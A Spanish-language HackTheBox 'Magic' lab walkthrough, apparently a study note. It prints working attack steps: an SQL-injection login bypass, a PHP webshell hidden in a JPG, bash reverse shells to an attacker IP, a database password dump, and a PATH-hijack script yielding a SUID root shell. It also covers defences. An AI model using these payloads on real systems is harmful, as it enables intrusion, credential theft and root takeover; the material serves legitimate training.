---
title: Magic (HackTheBox Medium)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, medium, sqli, file-upload, suid, path-hijacking, linux]
type: nota
status: en-progreso
source: claude-code
aliases: [Magic, HTB Magic, magic htb]
---

# Magic — HackTheBox (Medium)

Ficha: SO: Linux (Ubuntu) · Dificultad: Medium · Skills: SQLi bypass de login, bypass de validación de subida de archivos (polyglot imagen+PHP), enumeración de credenciales en código fuente, `mysqldump`, privesc por SUID con PATH hijacking.

> Recordatorio ético: HTB es un laboratorio **legal y autorizado**. Solo se ataca lo que se nos permite explícitamente.

**Cadena completa:** un puerto 80 sirve una galería de fotos con login. Se bypassea la autenticación con una **SQLi** clásica (`' or 1=1 -- -`), lo que da acceso a `upload.php`. La subida valida extensión *y* magic bytes, así que se sube un **polyglot** (un JPG real con código PHP inyectado) usando doble extensión `.php.jpg` → **RCE como `www-data`**. En el código (`db.php5`) hay credenciales MySQL; como no hay cliente `mysql`, se usa **`mysqldump`** para volcar la tabla `login` y obtener la password de **`theseus`** (reuso de contraseña) → `user.txt`. Finalmente, el binario SUID propio `/bin/sysinfo` llama a utilidades del sistema (`fdisk`, `lshw`...) **sin ruta absoluta** → **PATH hijacking** → root.

## Objetivo

Obtener las dos flags: `user.txt` (home de `theseus`) y `root.txt` (`/root`), documentando la metodología y los patrones reutilizables.

## Acceso a la máquina (paso previo)

Las máquinas retiradas (`10.10.10.x`) requieren suscripción **VIP**. Si usas **Pwnbox** ya viene conectado a la VPN; en local:

```bash
# 1) Conectar la VPN del laboratorio y DEJAR la terminal abierta
sudo openvpn lab_<usuario>.ovpn
# Espera la línea "Initialization Sequence Completed"
```

En la web de HTB pulsa **Spawn Machine** → te da una IP `10.10.10.x`. Verifica conectividad:

```bash
ping -c2 <IP>
```

Salida esperada: respuestas con `ttl=63` (un salto por la VPN → era 64). Si no responde, revisa que la VPN siga arriba (`ip a | grep tun0`). A partir de aquí sustituye `<IP>` por la real.

## Reconocimiento

**Escaneo completo de puertos + versiones + scripts por defecto:**

```bash
nmap -sC -sV -p- -oN nmap.txt <IP>
```

Qué hace: `-p-` escanea los 65535 puertos TCP (no asumir que todo está en el top-1000), `-sV` detecta versión del servicio, `-sC` lanza los scripts NSE por defecto (banners, certificados, títulos HTTP). `-oN` guarda en texto.

Salida esperada (lo relevante):

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu ...
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Qué buscar:
- **22 SSH OpenSSH 7.6p1**: superficie típica de *post-explotación* (entrar con credenciales que consigamos), no de explotación directa. Lo aparcamos.
- **80 Apache 2.4.29**: el vector. Toda la atención aquí. Patrón Medium clásico: **la web es el foothold**.

Truco: un primer escaneo rápido `nmap -F <IP>` o `-p-` con `--min-rate 5000` acelera mientras planificas, pero confía siempre en el `-p-` completo.

## Enumeración

**Categoría: enumeración web.** Empezamos por la galería en el navegador y con herramientas.

```bash
# Cabeceras y tecnología
whatweb http://<IP>
curl -sI http://<IP>
```

Verás Apache/Ubuntu. La portada es una **galería de fotos** ("Magic Portfolio"). Hay un enlace **Login**.

**Fuzzing de contenido** para mapear endpoints ocultos:

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php5,txt -t 50 -o gobuster.txt
```

Qué buscar en la salida: directorios `images/`, `assets/`, y ficheros `login.php`, `upload.php`, `index.php`. **`upload.php` redirige al login si no estás autenticado** (302/redirección): pista de que tras el login hay una funcionalidad de subida. Probablemente también veas `images/uploads/` (donde aterrizarán los ficheros subidos). Anótalo: ahí ejecutaremos la webshell.

El login (`login.php`) es un formulario `usuario/contraseña`. **Hipótesis #1: SQLi en el login**, el patrón más rentable en un formulario de autenticación de una Medium.

## Acceso inicial (foothold)

### Paso 1 — Bypass de autenticación por SQLi

**Categoría/vuln:** SQL Injection → *authentication bypass*. **Patrón:** si la query es `SELECT * FROM users WHERE user='$u' AND password='$p'` sin parametrizar, una comilla rompe la sintaxis y un `OR 1=1` hace la condición siempre verdadera.

En el formulario de `login.php`, en el campo **usuario** (o contraseña) prueba:

```sql
' or 1=1 -- -
```

Alternativa equivalente (comentar el resto tras un usuario conocido):

```sql
admin' -- -
```

Notas sobre la sintaxis:
- `-- -` es comentario MySQL; el espacio tras `--` es **obligatorio**, y el `-` final evita que un espacio final se pierda.
- Confirma primero que es inyectable: una sola `'` debería provocar error o comportamiento anómalo (login que se cuelga / mensaje distinto).

Resultado esperado: la app te autentica y te **redirige a `upload.php`** (o muestra el panel con el botón de subida). Foothold lógico conseguido: ya tenemos zona autenticada.

Alternativa automatizada (si quieres confirmar/mapear la inyección): `sqlmap -r login.req --dbs`. Para esta máquina el bypass manual basta y es más limpio; deja `sqlmap` para cuando no veas la inyección a ojo.

### Paso 2 — Subida de archivo: bypass con polyglot imagen+PHP

**Categoría/vuln:** *Unrestricted/insufficient file upload validation*. La pega: `upload.php` valida **dos cosas**:
1. **Extensión** (lista blanca de imágenes: `jpg/png/gif`).
2. **Contenido real**: `getimagesize()` y/o **magic bytes** (cabecera del fichero) para confirmar que es una imagen de verdad.

Si solo subes `shell.php`, falla la extensión. Si renombras `shell.php` → `shell.jpg`, falla `getimagesize()` (no es una imagen real). **Solución: polyglot** = un archivo que es **imagen válida Y contiene PHP**, con un nombre que el servidor sirva como PHP.

**Patrón del polyglot:** parte de un JPG real (sus magic bytes `FF D8 FF` pasan `getimagesize`) y mete el código PHP donde no rompa la imagen. Dos técnicas:

Técnica A — inyectar PHP en un campo EXIF con `exiftool` (limpia y fiable):

```bash
# Usa una imagen real cualquiera como base
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
```

Técnica B — concatenar el PHP al final de un JPG real:

```bash
cp imagen_real.jpg shell.jpg
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg
```

**El truco del nombre (doble extensión):** renombra a `shell.php.jpg`. Por qué funciona en muchas configs Apache: con `AddHandler`/`AddType` mal aplicados, Apache decide el handler por **cualquier** extensión `.php` presente en el nombre, no solo la última. Si `.php.jpg` no se ejecuta, prueba `.php.png` o `.phtml`. (Detalle que puede variar según la config exacta de la máquina: si el primer intento no ejecuta PHP, itera entre estas variantes — la técnica es la misma.)

```bash
mv shell.jpg shell.php.jpg
```

Sube `shell.php.jpg` por el formulario. Debe aceptarlo (pasa extensión + `getimagesize`). Ahora localiza dónde quedó (de gobuster: `images/uploads/`) y ejecútalo:

```bash
curl "http://<IP>/images/uploads/shell.php.jpg?cmd=id"
```

Salida esperada y qué buscar: entre los bytes binarios del JPG aparecerá el texto:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Eso es **RCE como `www-data`**. Foothold real conseguido.

Trampa típica: visitar el fichero en `images/` (la galería) en vez de `images/uploads/`. Confirma la ruta exacta con gobuster/burp viendo el `Location` de la respuesta de subida.

## Shell estable

Tener `?cmd=` es incómodo (sin estado, sin TTY). Conviértelo en **reverse shell interactiva**.

En tu Kali, ponte a escuchar:

```bash
nc -lvnp 9001
```

Lanza la reverse shell vía el parámetro `cmd` (URL-encodea la payload). Bash:

```bash
curl "http://<IP>/images/uploads/shell.php.jpg" --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<TU_IP_VPN>/9001 0>&1"'
```

> `<TU_IP_VPN>` es tu IP del `tun0` (mírala con `ip a show tun0`). Si la reverse `bash` no conecta, alternativas: `nc -e`, payload Python, o `mkfifo`. Usa `revshells.com` como chuleta.

Al recibir la conexión, **estabiliza la TTY** (patrón estándar):

```bash
# Dentro de la reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z para suspender
stty raw -echo; fg
# Enter, y luego:
export TERM=xterm
```

Ahora tienes flechas, autocompletado, Ctrl+C sin morir, y puedes usar `su`. Por qué importa: el siguiente paso (`su theseus`) necesita una **TTY real** para pedir la contraseña; sin PTY, `su` falla con "must be run from a terminal".

## Escalada de privilegios

### Fase 1: www-data → theseus (credenciales en código + mysqldump)

**Patrón:** las apps web guardan credenciales de BD en un fichero de config. Búscalas.

```bash
ls -la /var/www/Magic
cat /var/www/Magic/db.php5
```

Salida esperada (`db.php5`): un objeto con host, usuario, contraseña y nombre de BD (`Magic`). Algo como:

```php
$conn = new mysqli('localhost', 'theseus', '<pass_db>', 'Magic');
```

**Trampa clave:** intentas `mysql -u theseus -p` y **el cliente `mysql` no está instalado**. No te bloquees: usa otra herramienta del paquete cliente que **sí** está, `mysqldump`, que se conecta igual:

```bash
mysqldump --user=theseus --password='<pass_db>' Magic
```

Qué hace `mysqldump`: vuelca el esquema + datos de la BD `Magic` como sentencias SQL a stdout. Qué buscar: una tabla **`login`** con `username` y `password` (probablemente del usuario **`theseus`** en texto plano).

```sql
INSERT INTO `login` VALUES (1,'admin','<pass_theseus>');
```

**Reuso de contraseña** (patrón omnipresente): esa password del panel suele valer para la cuenta de sistema `theseus`. Con la PTY estable:

```bash
su theseus
# contraseña: <pass_theseus>
id
cat /home/theseus/user.txt
```

`user.txt` está en el **home de theseus** → lees `<flag>`. Alternativa: si la contraseña es válida en SSH, `ssh theseus@<IP>` da una shell aún más cómoda.

### Fase 2: theseus → root (SUID + PATH hijacking)

**Categoría/vuln:** binario **SUID propietario** que invoca utilidades **sin ruta absoluta** → *PATH hijacking*. Enumera SUIDs:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Qué buscar: entre los habituales (`/usr/bin/sudo`, `passwd`...) aparece uno **no estándar**: `/bin/sysinfo` con bit SUID y owner `root`. Inspecciónalo:

```bash
file /bin/sysinfo
strings /bin/sysinfo | grep -Ei 'lshw|fdisk|lsblk|free|cat|popen'
```

Salida esperada: `sysinfo` llama a `lshw`, `fdisk`, `lsblk`, `free`, etc. La pista de oro: los invoca **por nombre** (p. ej. `popen("fdisk -l", ...)` / `system("lshw ...")`), **no por ruta absoluta** (`/sbin/fdisk`). Como corre con EUID 0, *el binario que se ejecute lo hará como root*, y **nosotros controlamos el `PATH`** → secuestramos uno de esos nombres.

Explotación, paso a paso:

```bash
# 1) Crea un "fdisk" malicioso en un dir escribible
cd /tmp
cat > fdisk <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x fdisk

# 2) Pon /tmp delante en el PATH
export PATH=/tmp:$PATH

# 3) Dispara el SUID -> ejecuta TU fdisk como root
/bin/sysinfo

# 4) Shell root via copia SUID de bash
/tmp/rootbash -p
id   # -> uid=1000(theseus) euid=0(root)
```

Por qué `bash -p`: `-p` (privileged) evita que bash suelte el EUID de root al arrancar; sin `-p`, una bash SUID baja privilegios.

Alternativas a copiar bash:
- **Reverse shell root** directa dentro del falso `fdisk` (`bash -c 'bash -i >& /dev/tcp/<TU_IP>/9002 0>&1'`).
- **Leer la flag** sin shell: `cat /root/root.txt > /tmp/r.txt; chmod 666 /tmp/r.txt`.
- **Añadir clave SSH** a `/root/.ssh/authorized_keys`.

Trampa: secuestrar un binario que `sysinfo` **no** llame, o que la salida del SUID indique cuál ejecuta primero. Si `fdisk` no dispara, repite con `lshw`, `lsblk` o `free`.

## Flags

```bash
# Como theseus:
cat /home/theseus/user.txt        # user.txt -> <flag>

# Como root:
cat /root/root.txt                # root.txt -> <flag>
```

`user.txt` siempre en el **home del usuario** (`/home/theseus/`), `root.txt` en `/root/` (solo legible por root). Pega cada hash de 32 hex en HTB para puntuar.

## Patrón y teoría

Tres patrones reutilizables, con su contraparte defensiva (clave dev/purple team):

1. **SQLi → auth bypass.** Cualquier login con query construida por concatenación es vulnerable. *Defensa:* **prepared statements / consultas parametrizadas** (PDO con bind params, ORM), nunca interpolar input en SQL. Hash + sal de contraseñas (nunca texto plano, como aquí en `login`). Ver [[04-seguridad-web-owasp]] (A03 Injection).

2. **Validación de subida insuficiente (polyglot).** Validar solo extensión, o solo magic bytes, es insuficiente: un polyglot satisface ambas. *Defensa:* (a) **lista blanca de extensiones por la última extensión real** y renombrar el fichero a un nombre generado (sin la extensión del cliente); (b) servir uploads desde un **directorio sin ejecución de PHP** (`php_admin_flag engine off` / handler removido); (c) re-procesar la imagen (re-encode) para destruir payloads embebidos; (d) servir con `Content-Type` forzado y `Content-Disposition: attachment`. Ver [[04-seguridad-web-owasp]] (A01/Unrestricted Upload).

3. **SUID + PATH hijacking.** Un binario privilegiado que llama a otros por nombre confía en un `PATH` controlable por el atacante. *Defensa:* en C, **rutas absolutas** (`/sbin/fdisk`) o resetear el entorno; usar `execve` con PATH saneado, no `system`/`popen`; `setresuid()` para soltar privilegios antes de invocar externos; mínimo SUID posible (capabilities en su lugar). Ver [[06-seguridad-de-sistemas-y-hardening]].

Hilo conductor de la metodología: **recon (nmap) → enumeración del servicio web (gobuster, login) → foothold (SQLi + upload) → shell estable (revshell + PTY) → enumeración como usuario (config files + SUIDs) → escalada (PATH hijack) → root.** Es el esqueleto de casi toda Linux box.

## Trampas y errores comunes

1. **Doble extensión que no ejecuta:** `.php.jpg` depende de la config de Apache. Si no corre, itera `.php.png`, `.phtml`, `.php5`. No abandones la técnica: cambia la extensión.
2. **`getimagesize` te rechaza el archivo:** olvidaste partir de una **imagen real**. Un `.php` renombrado no tiene magic bytes válidos.
3. **`mysql` no existe → atascón.** El cliente interactivo no está, pero `mysqldump` (mismo paquete) sí. Lección: si una herramienta falta, busca su prima del mismo paquete.
4. **`su theseus` falla "must be run from a terminal":** no estabilizaste la PTY. Haz el `python3 pty.spawn` + `stty raw -echo; fg` antes.
5. **PATH hijack sin efecto:** secuestraste un binario que `sysinfo` no usa, o no exportaste bien `PATH` (debe ir `/tmp` **delante**), o tu script no es ejecutable (`chmod +x`). Verifica con `which fdisk` que apunta a `/tmp/fdisk`.

## Conexiones

- [[HTB_Medium/00_README]]
- [[MOC_Ciberseguridad]]
- [[HTB_Easy/00_README]] — paso anterior (Easy)
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]] — SQLi (A03) y file upload
- [[06-seguridad-de-sistemas-y-hardening]] — SUID, PATH, privesc Linux
